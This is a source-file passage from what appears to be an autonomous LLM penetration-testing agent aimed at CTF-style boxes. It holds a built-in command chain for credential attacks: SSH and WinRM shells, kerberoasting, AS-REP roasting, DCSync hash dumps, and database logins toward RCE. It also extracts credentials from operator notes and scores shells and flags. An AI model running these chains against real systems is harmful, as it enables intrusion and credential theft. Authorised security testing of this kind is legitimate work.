"""
agents/reasoning/decision_engine.py

Converts ranked hypotheses into justified, executable actions.

Before executing ANY tool the DecisionEngine:
  1. Checks the hypothesis meets the confidence threshold
  2. Verifies the tool+service has not already failed (NegativeMemory)
  3. Forces the LLM to produce a PreExecutionPlan (objective + actions + fallbacks)
  4. Returns a JustifiedAction with reason/expected_outcome/success_criteria

This is the component that replaces "run every tool" with
"run the minimum action necessary to test the best hypothesis".

Scoring
-------
  +10  validated foothold (shell or flag obtained)
  +5   high-confidence finding confirmed
  +2   hypothesis partially validated
  -3   redundant scan (tool already run on same target)
  -5   irrelevant exploit attempt (confidence < 0.4 but ran anyway)
  -10  repeated failed action (same tool+service tried again)
"""

from __future__ import annotations

import uuid
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

from agents.reasoning.hypothesis_engine import Hypothesis
from agents.reasoning.attack_planner    import RankedAttackPath
from agents.reasoning.negative_memory   import NegativeMemory


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class PreExecutionPlan:
    """
    Mandatory plan produced before any tool runs.
    Forces the LLM to reason about *why* an action is being taken.
    """
    objective:         str
    current_best_path: str
    required_actions:  List[str] = field(default_factory=list)
    fallback_paths:    List[str] = field(default_factory=list)
    risk_assessment:   str       = "medium"  # low|medium|high|critical

    def to_dict(self) -> dict:
        return {
            "objective":         self.objective,
            "current_best_path": self.current_best_path,
            "required_actions":  list(self.required_actions),
            "fallback_paths":    list(self.fallback_paths),
            "risk_assessment":   self.risk_assessment,
        }


@dataclass
class JustifiedAction:
    """
    A single executable action that has been approved by the DecisionEngine.
    Carries the full reasoning chain so the operator can audit every decision.
    """
    action_id:            str
    tool:                 str
    args:                 str
    target_service:       str
    reason:               str
    expected_outcome:     str
    success_criteria:     str
    hypothesis_id:        str
    confidence:           float
    requires_confirmation: bool = False
    plan:                 Optional[PreExecutionPlan] = None
    created_at:           str  = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )

    def to_dict(self) -> dict:
        return {
            "action_id":            self.action_id,
            "tool":                 self.tool,
            "args":                 self.args,
            "target_service":       self.target_service,
            "reason":               self.reason,
            "expected_outcome":     self.expected_outcome,
            "success_criteria":     self.success_criteria,
            "hypothesis_id":        self.hypothesis_id,
            "confidence":           self.confidence,
            "requires_confirmation": self.requires_confirmation,
            "plan":                 self.plan.to_dict() if self.plan else None,
            "created_at":           self.created_at,
        }


# Scoring deltas
_SCORE_FOOTHOLD:          int = +10
_SCORE_HIGH_CONF_FINDING: int = +5
_SCORE_PARTIAL_VALID:     int = +2
_SCORE_REDUNDANT_SCAN:    int = -3
_SCORE_IRRELEVANT_EXPLOIT: int = -5
_SCORE_REPEATED_FAILURE:  int = -10


# ---------------------------------------------------------------------------
# DecisionEngine
# ---------------------------------------------------------------------------

class DecisionEngine:
    """
    Selects the next action to execute based on ranked hypotheses.

    Parameters
    ----------
    think_json_fn:
        Async callable matching BaseAgent.think_json(prompt, system) → dict.
    emit_fn:
        Async broadcast callable — used to emit reasoning events to frontend.
    session_id:
        Active session identifier.
    auto_execute_threshold:
        Confidence floor for automatic execution (default 0.70).
        Actions below this threshold set requires_confirmation=True.
    """

    AUTO_EXECUTE_THRESHOLD: float = 0.70

    def __init__(
        self,
        think_json_fn:          Callable[..., Coroutine],
        emit_fn:                Callable[..., Any],
        session_id:             str,
        auto_execute_threshold: float = 0.70,
        voi_rank_fn:            Optional[Callable[[List[Dict[str, Any]]], List[Dict[str, Any]]]] = None,
    ) -> None:
        self._think_json  = think_json_fn
        self._emit        = emit_fn
        self._session_id  = session_id
        self._threshold   = auto_execute_threshold
        self._action_score: int = 0
        # Optional Value-of-Information ranker injected by MasterAgent.
        # Signature: rank_actions(list[dict]) -> list[dict] sorted by VoI desc,
        # each dict augmented with voi_score / voi_factors / voi_reasons / voi_dropped.
        self._voi_rank_fn = voi_rank_fn

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def select_action(
        self,
        hypotheses:      List[Hypothesis],
        intel:           dict,
        used_tools:      Dict[str, int],
        negative_memory: NegativeMemory,
    ) -> Optional[JustifiedAction]:
        """
        Select the best actionable hypothesis and return a JustifiedAction.

        Returns None when:
          - No actionable hypotheses exist (all invalidated or empty)
          - The best hypothesis has no recommended_next_actions

        Sets requires_confirmation=True when confidence < threshold.

        Parameters
        ----------
        hypotheses:
            Sorted by confidence descending (from HypothesisEngine).
        intel:
            Current master agent _intel dict.
        used_tools:
            {tool_name: run_count} tracking for redundancy detection.
        negative_memory:
            Failed attempts registry for quick pre-flight checks.
        """
        target = intel.get("target", "")

        # ── Phase 0a: Credentialed primer (HIGHEST priority) ─────────────
        # When operator notes contain ANY user:pass credentials AND a
        # service known to accept them is open, fire the deterministic
        # creds-in-hand chain ahead of everything else.  Covers AD
        # (SMB/WinRM/RDP/LDAP/Kerberos), Linux (SSH), databases (MySQL,
        # Postgres, MSSQL, MongoDB, Redis, Elasticsearch), web auth
        # (HTTP basic, Tomcat manager), and mail (SMTP).  The first step
        # whose port is open and whose chain hasn't yet fired runs.
        cred_primer = self._next_credentialed_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if cred_primer is not None:
            await self._emit_reasoning(
                f"[cred-primer] credentialed step: {cred_primer.tool} "
                f"→ {cred_primer.target_service} ({cred_primer.reason[:80]})"
            )
            return cred_primer

        # ── Phase 0b (Recommendation E): Foothold primers force-promoted ────
        # If an open service has a registered cheap-unauth primer chain
        # (FTP anon, telnet default-creds, SNMP public, SMB null-session,
        # DB default-creds, redis unauth) that has NOT yet been tried this
        # session, fire its first read-only step ahead of any LLM-proposed
        # action.  This is what turns "did we even try the door?" from a
        # planner-luck question into a deterministic guarantee.
        primer = self._next_unused_foothold_primer(
            intel           = intel,
            target          = target,
            used_tools      = used_tools,
            negative_memory = negative_memory,
        )
        if primer is not None:
            await self._emit_reasoning(
                f"[primer] auto-firing cheap-foothold probe: "
                f"{primer.tool} → {primer.target_service} (chain={primer.plan.path[0] if primer.plan and primer.plan.path else '?'})"
            )
            return primer

        # ── Phase 1: gather every viable (hypothesis, action) candidate ─────
        # Recommendation G — index validated hypotheses by id so dependent
        # steps in the current iteration can check whether their parent
        # has already landed.
        validated_ids: set = {
            h.hypothesis_id for h in hypotheses
            if getattr(h, "validated", False)
        }

        candidates: List[Dict[str, Any]] = []
        for hypothesis in hypotheses:
            if hypothesis.invalidated:
                continue
            if not hypothesis.recommended_next_actions:
                continue

            # Defer dependent steps until their parent is validated.  Steps
            # without a parent (the common case, idx=1) fall through.
            parent_id = getattr(hypothesis, "parent_hypothesis_id", None)
            if parent_id and parent_id not in validated_ids:
                await self._emit_reasoning(
                    f"Deferring step {getattr(hypothesis, 'step_index', '?')} "
                    f"({hypothesis.statement[:60]}…) — parent not yet validated"
                )
                continue

            for action_str in hypothesis.recommended_next_actions:
                if not action_str or not action_str.strip():
                    continue

                tool, args, target_service = self._parse_action_str(
                    action_str, target
                )
                if tool == "unknown":
                    continue

                # Hard skip: this exact (tool, service, args_signature) failed
                # before — Recommendation D's fine-grained ban.  A previous
                # sqlmap on /login.php?user= failing no longer blocks sqlmap
                # on /admin/api/users.php?id=.
                if negative_memory.has_failed_before(tool, target_service, args=args):
                    count = negative_memory.attempt_count(tool, target_service, args=args)
                    await self._emit_reasoning(
                        f"Skipping {tool} on {target_service} (this variant) — "
                        f"failed {count}x previously"
                    )
                    continue

                # Hard skip: scan already exhausted
                tool_key = f"{tool}:{target_service}"
                if used_tools.get(tool_key, 0) >= 3:
                    await self._emit_reasoning(
                        f"Skipping redundant scan: {tool} on {target_service} "
                        f"already run {used_tools[tool_key]}x"
                    )
                    continue

                candidates.append({
                    "tool":           tool,
                    "args":           args,
                    "target_service": target_service,
                    "action_str":     action_str,
                    "phase":          intel.get("current_phase", ""),
                    "confidence":     hypothesis.confidence,
                    "_hypothesis":    hypothesis,
                })

        if not candidates:
            return None

        # ── Phase 2: Value-of-Information re-ranking ────────────────────────
        ranked = candidates
        if self._voi_rank_fn is not None:
            try:
                # Strip the hypothesis ref before scoring (not JSON-friendly),
                # then re-attach by index after.
                scoring_input = [
                    {k: v for k, v in c.items() if k != "_hypothesis"}
                    for c in candidates
                ]
                scored = self._voi_rank_fn(scoring_input)
                # Re-attach hypothesis by matching action_str + tool + target_service
                lookup = {
                    (c["tool"], c["target_service"], c["action_str"]): c["_hypothesis"]
                    for c in candidates
                }
                ranked = []
                for s in scored:
                    key = (s.get("tool"), s.get("target_service"), s.get("action_str"))
                    s["_hypothesis"] = lookup.get(key)
                    ranked.append(s)
                # Drop hard-rejected actions
                ranked = [r for r in ranked if not r.get("voi_dropped")]
                # Emit a transparency event with the top of the ranking
                await self._emit_voi_ranking(ranked[:5])
            except Exception as exc:
                await self._emit_reasoning(f"VoI ranking failed: {exc}")
                ranked = candidates

        if not ranked:
            return None

        chosen = ranked[0]
        hypothesis = chosen.get("_hypothesis")
        if hypothesis is None:
            return None

        # Build pre-execution plan for the winner
        plan = await self.build_pre_execution_plan(hypothesis, intel)

        voi_score   = chosen.get("voi_score")
        voi_reasons = chosen.get("voi_reasons") or []

        reason = self._build_reason(hypothesis)
        if voi_score is not None:
            reason = f"[VoI={voi_score}] " + reason
            if voi_reasons:
                reason += "  ::  " + "; ".join(voi_reasons[:3])

        action = JustifiedAction(
            action_id            = str(uuid.uuid4()),
            tool                 = chosen["tool"],
            args                 = chosen["args"],
            target_service       = chosen["target_service"],
            reason               = reason,
            expected_outcome     = chosen.get("action_str", ""),
            success_criteria     = self._build_success_criteria(hypothesis),
            hypothesis_id        = hypothesis.hypothesis_id,
            confidence           = hypothesis.confidence,
            requires_confirmation = hypothesis.confidence < self._threshold,
            plan                 = plan,
        )

        await self._emit_action(action)
        return action

    async def build_pre_execution_plan(
        self,
        hypothesis: Hypothesis,
        intel:      dict,
    ) -> PreExecutionPlan:
        """
        Force the LLM to produce an explicit plan before any tool runs.

        Returns a safe fallback plan on LLM failure.
        """
        system = (
            "You are a penetration tester about to execute an attack step. "
            "Before running any tool you must articulate your objective, the "
            "specific path you are following, the ordered actions required, and "
            "fallback options if the primary path fails. "
            "Respond ONLY with valid JSON. No markdown."
        )

        target = intel.get("target", "unknown")
        shell  = "YES" if intel.get("shell_access") else "NO"

        prompt = (
            f"Target: {target}\n"
            f"Shell access: {shell}\n"
            f"Hypothesis: {hypothesis.statement}\n"
            f"Confidence: {hypothesis.confidence:.2f}\n"
            f"Supporting evidence: {', '.join(hypothesis.evidence_supporting[:3])}\n"
            f"Next actions proposed: {', '.join(hypothesis.recommended_next_actions[:3])}\n\n"
            "Produce a pre-execution plan in EXACTLY this JSON format:\n"
            "{\n"
            '  "objective": "specific goal of this action",\n'
            '  "current_best_path": "brief description of the attack path",\n'
            '  "required_actions": ["ordered list of exact tool commands"],\n'
            '  "fallback_paths": ["alternative approaches if primary fails"],\n'
            '  "risk_assessment": "low|medium|high|critical"\n'
            "}"
        )

        try:
            raw = await self._think_json(prompt, system)
            if raw and isinstance(raw, dict):
                return PreExecutionPlan(
                    objective         = str(raw.get("objective", hypothesis.statement)),
                    current_best_path = str(raw.get("current_best_path", "")),
                    required_actions  = [
                        str(a) for a in (raw.get("required_actions") or [])
                    ],
                    fallback_paths    = [
                        str(f) for f in (raw.get("fallback_paths") or [])
                    ],
                    risk_assessment   = str(raw.get("risk_assessment", "medium")),
                )
        except Exception:
            pass

        # Safe fallback
        return PreExecutionPlan(
            objective         = hypothesis.statement,
            current_best_path = hypothesis.statement,
            required_actions  = list(hypothesis.recommended_next_actions[:3]),
            fallback_paths    = [],
            risk_assessment   = "medium",
        )

    async def score_action_result(
        self,
        action:       JustifiedAction,
        result:       dict,
        validated:    bool,
        intel:        dict,
    ) -> Tuple[int, str]:
        """
        Apply scoring rules and return (new_total_score, reason_string).

        Called by ReasoningLoop._update() after every tool execution.
        """
        delta  = 0
        reason = ""

        # Foothold obtained
        if intel.get("shell_access") and not result.get("_was_shell_before", False):
            delta  += _SCORE_FOOTHOLD
            reason  = "Foothold obtained — shell access confirmed"

        # Flag captured
        elif intel.get("user_flag") or intel.get("root_flag"):
            delta  += _SCORE_FOOTHOLD
            reason  = "Flag captured"

        # High-confidence finding validated
        elif validated and action.confidence >= 0.7:
            delta  += _SCORE_HIGH_CONF_FINDING
            reason  = f"High-confidence finding validated (conf={action.confidence:.2f})"

        # Partial validation
        elif validated:
            delta  += _SCORE_PARTIAL_VALID
            reason  = "Hypothesis partially validated"

        # Repeated failure (negative memory already had this)
        elif not validated and action.confidence < 0.4:
            delta  += _SCORE_IRRELEVANT_EXPLOIT
            reason  = f"Low-confidence exploit attempt failed (conf={action.confidence:.2f})"

        # Not validated — neutral, no penalty for honest attempts
        else:
            reason = "Action executed — hypothesis not yet validated"

        self._action_score += delta
        return self._action_score, reason

    def get_score(self) -> int:
        """Return the current cumulative engagement score."""
        return self._action_score

    def set_score(self, score: int) -> None:
        """Restore score from checkpoint."""
        self._action_score = score

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _parse_action_str(
        self,
        action_str: str,
        target:     str,
    ) -> Tuple[str, str, str]:
        """
        Parse an action string like "sqlmap -u http://TARGET/login" into
        (tool, args, target_service).

        Falls back gracefully when the string is not a recognisable command.
        """
        action_str = action_str.strip()
        parts      = action_str.split(None, 1)  # split on first whitespace
        tool       = parts[0].lower() if parts else "unknown"
        args       = parts[1] if len(parts) > 1 else ""

        # Derive a target_service identifier from the args or tool name
        target_service = self._infer_target_service(tool, args, target)

        return tool, args, target_service

    def _infer_target_service(self, tool: str, args: str, target: str) -> str:
        """
        Attempt to derive a "service:port" identifier from tool and args.
        Used for NegativeMemory dedup and redundancy detection.
        """
        combined = (args or "").lower()

        # Port patterns
        import re
        port_match = re.search(r':(\d{2,5})', combined)
        if port_match:
            port = port_match.group(1)
            # Guess service from port
            service_map = {
                "21": "ftp", "22": "ssh", "23": "telnet",
                "25": "smtp", "53": "dns", "80": "http",
                "110": "pop3", "143": "imap", "389": "ldap",
                "443": "https", "445": "smb", "1433": "mssql",
                "1521": "oracle", "3306": "mysql", "3389": "rdp",
                "5432": "postgresql", "5900": "vnc", "6379": "redis",
                "8080": "http", "8443": "https", "8888": "http",
            }
            svc = service_map.get(port, "tcp")
            return f"{svc}:{port}"

        # Tool → service inference
        tool_service = {
            "sqlmap":     f"http:80",
            "hydra":      f"ssh:22",
            "crackmapexec": f"smb:445",
            "nmap":       f"scan:{target}",
            "gobuster":   f"http:80",
            "ffuf":       f"http:80",
            "nikto":      f"http:80",
            "dirb":       f"http:80",
            "wpscan":     f"http:80",
            "msfconsole": f"exploit:{target}",
            "searchsploit": f"exploit:{target}",
            "impacket-secretsdump": f"smb:445",
            "evil-winrm": f"winrm:5985",
            "bloodhound-python": f"ldap:389",
        }
        return tool_service.get(tool, f"{tool}:{target}")

    # ── Credentialed primer (operator-supplied creds chain) ──────────────
    # When the operator pastes credentials in `notes` / `scope` we fire
    # this deterministic chain ahead of any LLM planning.  Each entry
    # produces a single command using the placeholders:
    #   {target}, {user}, {pass}, {domain}, {dc_ip}, {base_dn}
    # Steps that need {domain}/{base_dn} skip themselves until those
    # values are populated by recon (rdp-ntlm-info, ldap rootDSE, etc.) —
    # so a Linux SSH-only box never tries to kerberoast.
    #
    # Coverage matrix (port → handler):
    #   22         SSH login
    #   21         FTP login
    #   25/587     SMTP AUTH
    #   88         Kerberoast / AS-REP roast      (AD)
    #   389        LDAP simple bind / BloodHound  (AD)
    #   445        SMB validate / enum / DCSync   (AD)
    #   1433       MSSQL login (Windows-auth)     (AD-friendly)
    #   3306       MySQL login
    #   3389       RDP login                      (AD-friendly)
    #   5432       PostgreSQL login
    #   5985       WinRM check + evil-winrm       (AD)
    #   6379       Redis AUTH
    #   8080/8443  HTTP basic / Tomcat manager
    #   9200       Elasticsearch
    #   27017      MongoDB
    #
    # Order matters for boxes where multiple services accept the same
    # creds — we list the cheapest-to-shell paths first (SSH, evil-winrm)
    # so the platform lands a foothold ASAP.
    _CRED_PRIMERS: List[Dict[str, Any]] = [
        # ── SSH (Linux/Unix path to shell) ────────────────────────────
        # Single non-interactive command that proves auth + dumps host
        # info.  `id` output (`uid=N(...)`) trips register_shell's real-
        # foothold regex so the post-ex / privesc gate flips correctly.
        {"chain": "ssh_creds_login", "ports": ["22"],
         "tool": "sshpass",
         "args": "-p '{pass}' ssh -o StrictHostKeyChecking=no -o BatchMode=no -o ConnectTimeout=10 -o PreferredAuthentications=password -o PubkeyAuthentication=no {user}@{target} 'id; whoami; hostname; uname -a; cat /etc/os-release 2>/dev/null'",
         "service_label": "ssh:22",
         "rationale": "SSH login with creds — produces uid= evidence, instant Linux foothold"},
        # ── AD: SMB cred validation ───────────────────────────────────
        {"chain": "ad_creds_validate_smb", "ports": ["445"],
         "tool": "crackmapexec",
         "args": "smb {target} -u '{user}' -p '{pass}'",
         "service_label": "smb:445",
         "rationale": "validate AD credentials before heavier action"},
        # ── AD: SMB enumeration ───────────────────────────────────────
        {"chain": "ad_creds_enum_smb", "ports": ["445"],
         "tool": "crackmapexec",
         "args": "smb {target} -u '{user}' -p '{pass}' --shares --users --groups --pass-pol --rid-brute 4000",
         "service_label": "smb:445",
         "rationale": "enumerate AD with creds — shares, users, groups, RID brute"},
        # ── AD: WinRM check (likely Pwn3d!) ───────────────────────────
        {"chain": "ad_creds_winrm_check", "ports": ["5985"],
         "tool": "crackmapexec",
         "args": "winrm {target} -u '{user}' -p '{pass}'",
         "service_label": "winrm:5985",
         "rationale": "check WinRM — `Pwn3d!` line means evil-winrm gives instant shell"},
        # ── AD: evil-winrm interactive shell ──────────────────────────
        {"chain": "ad_creds_winrm_shell", "ports": ["5985"],
         "tool": "evil-winrm",
         "args": "-i {target} -u '{user}' -p '{pass}'",
         "service_label": "winrm:5985",
         "rationale": "WinRM interactive shell with valid creds — direct foothold"},
        # ── AD: Kerberoasting ─────────────────────────────────────────
        {"chain": "ad_creds_kerberoast", "ports": ["88"],
         "tool": "impacket-GetUserSPNs",
         "args": "{domain}/{user}:'{pass}' -dc-ip {target} -request -outputfile /tmp/kerberoast.{target}.txt",
         "service_label": "kerberos:88",
         "rationale": "kerberoast — request TGS for service accounts, crack offline"},
        # ── AD: AS-REP roasting ───────────────────────────────────────
        {"chain": "ad_creds_asreproast", "ports": ["88"],
         "tool": "impacket-GetNPUsers",
         "args": "{domain}/{user}:'{pass}' -dc-ip {target} -request -outputfile /tmp/asreproast.{target}.txt",
         "service_label": "kerberos:88",
         "rationale": "AS-REP roast — find users with DONT_REQ_PREAUTH"},
        # ── LDAP simple bind (works on AD and standalone OpenLDAP) ────
        # Skipped if {domain} / {base_dn} unfilled.
        {"chain": "ldap_simple_bind_userinfo", "ports": ["389"],
         "tool": "ldapsearch",
         "args": "-H ldap://{target} -x -D '{user}@{domain}' -w '{pass}' -b '{base_dn}' '(sAMAccountName={user})'",
         "service_label": "ldap:389",
         "rationale": "fetch caller's directory object — group membership, ACL targets"},
        # ── AD: BloodHound collection ─────────────────────────────────
        {"chain": "ad_creds_bloodhound", "ports": ["389"],
         "tool": "bloodhound-python",
         "args": "-d {domain} -u '{user}' -p '{pass}' -ns {target} -c All --zip",
         "service_label": "ldap:389",
         "rationale": "full AD attack-graph collection for offline path analysis"},
        # ── AD: RDP try ───────────────────────────────────────────────
        {"chain": "ad_creds_rdp_try", "ports": ["3389"],
         "tool": "xfreerdp",
         "args": "/v:{target} /u:{user} /p:'{pass}' /cert:ignore /size:1024x768 +clipboard",
         "service_label": "rdp:3389",
         "rationale": "RDP with valid creds — interactive Windows desktop session"},
        # ── AD: SecretsDump (DCSync) ──────────────────────────────────
        {"chain": "ad_creds_secretsdump_try", "ports": ["445"],
         "tool": "impacket-secretsdump",
         "args": "{domain}/{user}:'{pass}'@{target} -just-dc-ntlm",
         "service_label": "smb:445",
         "rationale": "DCSync — gives every NT hash if user has GetChanges rights"},

        # ── Database services ─────────────────────────────────────────
        # MSSQL — Windows auth path; common AD lateral escalation.
        {"chain": "mssql_creds_login", "ports": ["1433"],
         "tool": "impacket-mssqlclient",
         "args": "{user}:'{pass}'@{target} -windows-auth",
         "service_label": "mssql:1433",
         "rationale": "MSSQL Windows-auth — xp_cmdshell often gives RCE on misconfigured boxes"},
        # MySQL — list databases proves cred validity.
        {"chain": "mysql_creds_login", "ports": ["3306"],
         "tool": "mysql",
         "args": "-h {target} -u {user} -p'{pass}' -e 'SELECT user(), version(); SHOW DATABASES;'",
         "service_label": "mysql:3306",
         "rationale": "MySQL with creds — version + DB list, sometimes UDF→RCE path"},
        # PostgreSQL — connection-string variant avoids PGPASSWORD env handling.
        {"chain": "postgres_creds_login", "ports": ["5432"],
         "tool": "psql",
         "args": "'postgresql://{user}:{pass}@{target}:5432/postgres' -c '\\l'",
         "service_label": "postgresql:5432",
         "rationale": "PostgreSQL with creds — list DBs, COPY ... PROGRAM = RCE on >= 9.3"},
        # MongoDB — auth + DB list.
        {"chain": "mongodb_creds_login", "ports": ["27017"],
         "tool": "mongosh",
         "args": "--host {target} -u {user} -p '{pass}' --authenticationDatabase admin --eval 'db.adminCommand({{listDatabases:1}})'",
         "service_label": "mongodb:27017",
         "rationale": "MongoDB with creds — list DBs, server roles for privesc"},
        # Redis — AUTH check (no user, password-only on legacy servers).
        {"chain": "redis_creds_auth", "ports": ["6379"],
         "tool": "redis-cli",
         "args": "-h {target} -a '{pass}' INFO server",
         "service_label": "redis:6379",
         "rationale": "Redis AUTH — server info, then write-key foothold path"},
        # Elasticsearch — basic auth.
        {"chain": "elastic_creds_check", "ports": ["9200"],
         "tool": "curl",
         "args": "-s -u '{user}:{pass}' http://{target}:9200/_cat/indices?v",
         "service_label": "elasticsearch:9200",
         "rationale": "Elasticsearch basic-auth — list indices, possible info leak"},

        # ── FTP ───────────────────────────────────────────────────────
        {"chain": "ftp_creds_login", "ports": ["21"],
         "tool": "curl",
         "args": "-u '{user}:{pass}' --connect-timeout 15 ftp://{target}/ -s -o /dev/null -w 'http_code=%{{http_code}} ftp_user={user}\\n'",
         "service_label": "ftp:21",
         "rationale": "FTP login check — validates creds, lists root"},

        # ── SMTP AUTH (relay / spoofing prerequisite) ─────────────────
        {"chain": "smtp_creds_authcheck", "ports": ["25", "587"],
         "tool": "swaks",
         "args": "--server {target} --auth-user {user} --auth-password '{pass}' --quit-after AUTH",
         "service_label": "smtp:25",
         "rationale": "SMTP AUTH check — validates creds for relay / spoofing"},

        # ── HTTP basic auth (sometimes serves admin panels) ───────────
        {"chain": "http_basic_creds_check", "ports": ["80", "8080"],
         "tool": "curl",
         "args": "-s -o /dev/null -w 'http=%{{http_code}} url=%{{url_effective}}\\n' --connect-timeout 15 -u '{user}:{pass}' http://{target}/",
         "service_label": "http:80",
         "rationale": "HTTP basic-auth check — validates creds against root URL"},
        {"chain": "https_basic_creds_check", "ports": ["443", "8443"],
         "tool": "curl",
         "args": "-sk -o /dev/null -w 'http=%{{http_code}} url=%{{url_effective}}\\n' --connect-timeout 15 -u '{user}:{pass}' https://{target}/",
         "service_label": "https:443",
         "rationale": "HTTPS basic-auth check"},
        # ── Tomcat manager (creds → WAR upload → RCE) ─────────────────
        {"chain": "tomcat_manager_creds", "ports": ["8080", "8443"],
         "tool": "curl",
         "args": "-s -u '{user}:{pass}' --connect-timeout 15 http://{target}:8080/manager/text/list",
         "service_label": "tomcat:8080",
         "rationale": "Tomcat manager check — creds work? then WAR upload → RCE"},
    ]
    # Backwards-compat alias: older code paths may still reference the
    # original AD-only name.  Keep the symbol so nothing imports break.
    _CRED_AD_PRIMERS = _CRED_PRIMERS

    # Regex set for credential extraction from operator_notes free text.
    # Compiled lazily.
    _CRED_PATTERNS = None

    @classmethod
    def _compile_cred_patterns(cls):
        if cls._CRED_PATTERNS is not None:
            return cls._CRED_PATTERNS
        import re
        # All patterns require the password to contain at least one digit OR
        # one special character — this rules out dictionary-word false positives
        # like "no creds yet, just scope ..." matching as user='yet' pass='just'.
        # Real AD passwords almost always have complexity, so this is safe.
        _PWD = r"(?P<pwd>(?=[^\s'\"]*[0-9!@#$%^&*+=_?,.~/\\|:;<>{}\[\]()-])[^\s'\"]{4,})"
        cls._CRED_PATTERNS = [
            # 1. DOMAIN\user:pass   or   DOMAIN/user:pass
            re.compile(rf"(?P<domain>[A-Za-z0-9_.-]+)[\\/](?P<user>[A-Za-z0-9_.-]+)\s*:\s*['\"]?{_PWD}['\"]?"),
            # 2. user@domain.tld:pass
            re.compile(rf"(?P<user>[A-Za-z0-9_.-]+)@(?P<domain>[A-Za-z0-9_.-]+\.[A-Za-z0-9_.-]+)\s*:\s*['\"]?{_PWD}['\"]?"),
            # 3. Explicit user/username + password keys on the same line/note
            re.compile(rf"\b(?:user(?:name)?|login)\s*[:=]\s*['\"]?(?P<user>[A-Za-z0-9_.-]+)['\"]?[\s,;]+(?:pass(?:word)?|pwd)\s*[:=]\s*['\"]?{_PWD}['\"]?", re.I),
            # 4. creds: user / pass   or   credentials = user|pass
            re.compile(rf"\b(?:creds?|credentials?)\s*[:=]?\s+['\"]?(?P<user>[A-Za-z0-9_.-]+)['\"]?\s*[/|]\s*['\"]?{_PWD}['\"]?", re.I),
            # 5. bare user:pass — only when surrounded by whitespace / boundary
            re.compile(rf"(?:^|\s|[\(\[\"'`])(?P<user>[A-Za-z][A-Za-z0-9_.-]{{1,30}}):{_PWD}(?:\s|$|[\)\]\"'`])"),
        ]
        return cls._CRED_PATTERNS

    @classmethod
    def _extract_credentials(cls, intel: dict) -> Optional[Dict[str, str]]:
        """Pull the first valid (user, password, domain) triple from
        operator_notes.  Returns None if no creds detected.

        domain falls back to whatever the recon phase has discovered
        (rdp-ntlm-info, smb-os-discovery, ldap rootDSE) — see
        _resolve_ad_domain.  base_dn is computed from domain.
        """
        notes = intel.get("operator_notes") or []
        if not notes:
            return None

        # Concatenate all note text so a multi-line note still matches.
        blob = "\n".join(
            (n.get("note") if isinstance(n, dict) else str(n)) or ""
            for n in notes
        )
        if not blob.strip():
            return None

        for pat in cls._compile_cred_patterns():
            m = pat.search(blob)
            if not m:
                continue
            gd = m.groupdict()
            user = (gd.get("user") or "").strip()
            pwd  = (gd.get("pwd")  or "").strip()
            dom  = (gd.get("domain") or "").strip()
            # Reject obvious non-creds: empty, http URL fragments, key:value where
            # the "value" is itself a URL or numeric port.
            if not user or not pwd:
                continue
            if user.lower() in ("http", "https", "ftp", "smb", "ssh", "tcp", "udp"):
                continue
            if pwd.startswith(("http", "//", "tcp", "udp")) or pwd.isdigit():
                continue
            if len(pwd) < 4:
                continue
            return {"user": user, "pass": pwd, "domain": dom or ""}

        return None

    # Compiled patterns that recognise an AD DNS domain in tool output.
    # Order matters — DNS-style names beat NetBIOS short names because
    # the DNS form gives us a usable base DN (dc=corp,dc=local).
    _DOMAIN_OUTPUT_PATTERNS = None

    @classmethod
    def _compile_domain_patterns(cls):
        if cls._DOMAIN_OUTPUT_PATTERNS is not None:
            return cls._DOMAIN_OUTPUT_PATTERNS
        import re
        cls._DOMAIN_OUTPUT_PATTERNS = [
            # rdp-ntlm-info / smb-os-discovery NSE script line
            (re.compile(r"DNS_Domain_Name:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.99),
            # crackmapexec / netexec banner: (domain:garfield.htb)
            (re.compile(r"\(domain:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})\)", re.I), 0.99),
            # ldapsearch / dnsrecon style: dc=garfield,dc=htb  →  garfield.htb
            (re.compile(r"\bdc=([A-Za-z0-9_-]+)(?:\s*,\s*dc=([A-Za-z0-9_-]+))+", re.I), 0.95),
            # Active Directory LDAP: Microsoft Windows Active Directory LDAP (Domain: garfield.htb)
            (re.compile(r"Active Directory LDAP\s*\(Domain:\s*([A-Za-z0-9._-]+\.[A-Za-z]{2,})", re.I), 0.99),
            # FQDN of the DC itself (DNS_Computer_Name field)
            (re.compile(r"DNS_Computer_Name:\s*[A-Za-z0-9_-]+\.([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.95),
            # Generic "Domain Controller for <domain>"
            (re.compile(r"[Dd]omain[\s_-]?[Cc]ontroller[^\n]{0,40}?([A-Za-z0-9_-]+\.[A-Za-z]{2,})"), 0.85),
            # smb-os-discovery: Computer name: dc01.garfield.htb
            (re.compile(r"Computer name:\s*[A-Za-z0-9_-]+\.([A-Za-z0-9._-]+\.[A-Za-z]{2,})"), 0.90),
        ]
        return cls._DOMAIN_OUTPUT_PATTERNS

    @classmethod
    def _scan_raw_outputs_for_domain(cls, intel: dict) -> str:
        """Walk every blob in intel['raw_outputs'] and return the first
        confidently-matched AD DNS domain.  Empty string if none.

        Cheap regex sweep — runs only when the primer needs a domain and
        intel['domain'] / intel['ad'] haven't been populated yet by other
        extractors.
        """
        raw = intel.get("raw_outputs") or {}
        if not isinstance(raw, dict):
            return ""

        # Concatenate all blobs (capped to keep the regex cheap).
        # Raw outputs can be large; we only need the headers/banners.
        blobs: List[str] = []
        for tool_name, blob in raw.items():
            if not blob:
                continue
            text = blob if isinstance(blob, str) else str(blob)
            blobs.append(text[:8000])
        if not blobs:
            return ""
        all_text = "\n".join(blobs)

        for pat, _conf in cls._compile_domain_patterns():
            m = pat.search(all_text)
            if not m:
                continue
            # dc=foo,dc=bar pattern needs assembly from all groups
            if "dc=" in pat.pattern.lower():
                # Re-extract every dc=XXX component in order
                import re
                comps = re.findall(r"dc=([A-Za-z0-9_-]+)", m.group(0), re.I)
                if len(comps) >= 2:
                    return ".".join(comps).lower()
                continue
            cand = (m.group(1) or "").strip().lower()
            # Reject obvious garbage: very short, all-numeric, or template literal
